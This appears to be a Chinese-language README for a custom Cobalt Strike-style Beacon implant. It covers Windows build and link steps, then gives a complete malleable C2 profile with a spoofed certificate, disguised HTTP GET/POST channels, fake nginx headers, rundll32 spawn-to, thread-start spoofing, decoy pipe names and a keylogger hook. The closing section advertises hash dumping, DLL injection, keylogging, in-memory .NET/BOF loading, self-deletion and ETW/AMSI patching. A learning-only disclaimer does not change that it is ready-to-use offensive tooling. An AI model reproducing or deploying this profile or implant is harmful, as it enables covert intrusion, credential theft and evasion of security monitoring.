# 安装编译
## 安装
- vcpkg

### 使用 vcpkg 安装如下环境
- curl_x64-windows
- dirent_x64-windows
- openssl_x64-windows
- pthreads_x64-windows
- zlib_x64-windows

## 配置
### 1  
<img width="963" alt="截屏2024-08-24 下午10 30 29" src="https://github.com/user-attachments/assets/bc1a12fb-8567-4442-8fc2-390241d56582">   


### 2  
<img width="976" alt="截屏2024-08-24 下午10 30 52" src="https://github.com/user-attachments/assets/41c97d82-a8e4-4090-b908-a80894baf44c">  


### 3  
<img width="971" alt="截屏2024-08-24 下午10 31 32" src="https://github.com/user-attachments/assets/f864b1d1-7535-4e04-a906-81c7ea615c20">  

```
dbghelp.lib  
zlib.lib  
Crypt32.lib  
libcurl.lib  
E:\Code\vcpkg\packages\openssl_x64-windows-static\lib\libcrypto.lib  
E:\Code\vcpkg\packages\openssl_x64-windows-static\lib\libssl.lib  
advapi32.lib  
normaliz.lib  
ws2_32.lib  
wldap32.lib  
```


## 默认 Profile 文件
```

# default sleep time is 60s
set sleeptime "3000";
set jitter "7";

https-certificate {
    set C "KZ";
    set CN "foren.zik";
    set O "NN Fern Sub";
    set OU "NN Fern";
    set ST "KZ";
    set validity "365";
}

# define indicators for an HTTP GET
http-get {

	set uri "/www/handle/doc";

	client {
		#header "Host" "aliyun.com";
		# base64 encode session metadata and store it in the Cookie header.
		metadata {
			base64url;
			prepend "SESSIONID=";
			header "Cookie";
		}
	}

	server {
		# server should send output with no changes
		#header "Content-Type" "application/octet-stream";
		header "Server" "nginx/1.10.3 (Ubuntu)";
    		header "Content-Type" "application/octet-stream";
        	header "Connection" "keep-alive";
        	header "Vary" "Accept";
        	header "Pragma" "public";
        	header "Expires" "0";
        	header "Cache-Control" "must-revalidate, post-check=0, pre-check=0";

		output {
			mask;
			netbios;
			prepend "data=";
			append "%%";
			print;
		}
	}
}

# define indicators for an HTTP 
http-post {
	# Same as above, Beacon will randomly choose from this pool of URIs [if multiple URIs are provided]
	set uri "/IMXo";
	client {
		#header "Content-Type" "application/octet-stream";				

		# transmit our session identifier as /submit.php?id=[identifier]
		
		id {				
			mask;
			netbiosu;
			prepend "user=";
			append "%%";
			header "User";
		}

		# post our output with no real changes
		output {
			mask;
			base64url;
			prepend "data=";
			append "%%";		
			print;
		}
	}

	# The server's response to our HTTP POST
	server {
		header "Server" "nginx/1.10.3 (Ubuntu)";
    		header "Content-Type" "application/octet-stream";
        	header "Connection" "keep-alive";
       	 	header "Vary" "Accept";
        	header "Pragma" "public";
        	header "Expires" "0";
        	header "Cache-Control" "must-revalidate, post-check=0, pre-check=0";

		# this will just print an empty string, meh...
		output {
			mask;
			netbios;
			prepend "data=";
			append "%%";
			print;
		}
	}
}

post-ex {
    set spawnto_x86 "c:\\windows\\syswow64\\rundll32.exe";
    set spawnto_x64 "c:\\windows\\system32\\rundll32.exe";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";
}

```



======================================

# Beacon

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担。

## 0x01、介绍

作者：[Monster3](https://github.com/M0nster3)

以后不主要搞安全了，把之前搞得一些东西放出来，大家可以参考参考。

## 0x02、实现的一些功能

目前实现修改过的 dump hash ，dll 注入功能，键盘记录，joblist，jobkill，Bof 加载，net 内存加载，shell，run、文件操作相应的功能，sleep，获取主机目录，还有自删除以及 patch ETW，patch Amsi 还添加了光明之门等功能。

可能有一些bug，师傅们看的自己修改一下

